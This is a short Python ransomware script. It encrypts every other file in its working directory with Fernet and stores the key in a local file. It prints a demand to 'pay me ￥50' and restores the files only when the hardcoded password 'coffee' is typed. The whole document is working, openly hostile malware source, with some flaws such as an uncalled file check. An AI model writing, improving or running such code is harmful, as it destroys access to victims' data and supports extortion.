from cryptography.fernet import Fernet
import os


files = []

for file in os.listdir():
    if file == 'ransomware.py' or file == 'thekey.key' or file == 'decrypt.py':
        continue
    if os.path.isfile:
        files.append(file)

secret_key = Fernet.generate_key()

with open(r'thekey.key', 'wb') as thekey:
    thekey.write(secret_key)

for file in files:
    with open(file, 'rb') as thefile:
        contents = thefile.read()

    encrypted_contents = Fernet(secret_key).encrypt(contents)
    with open(file, 'wb') as secret:
        secret.write(encrypted_contents)
print("Your files had been encrypted,pay me ï¿¥50 to unclock them.")

phrase = ''

lock = True
while lock:
    phrase = input("Please input the password:")

    if phrase == 'coffee':
        with open(r'thekey.key', 'rb') as thekey:
            key = thekey.read()

        for file in files:
            with open(file, 'rb') as thefile:
                contents = thefile.read()

            decrypted_contents = Fernet(key).decrypt(contents)
            with open(file, 'wb') as secret:
                secret.write(decrypted_contents)
        lock = False
        print("All of your files are unlocked,enjoying your coffee.")
    else:
        print("You input the wrong password, pay me more to unlock them.")
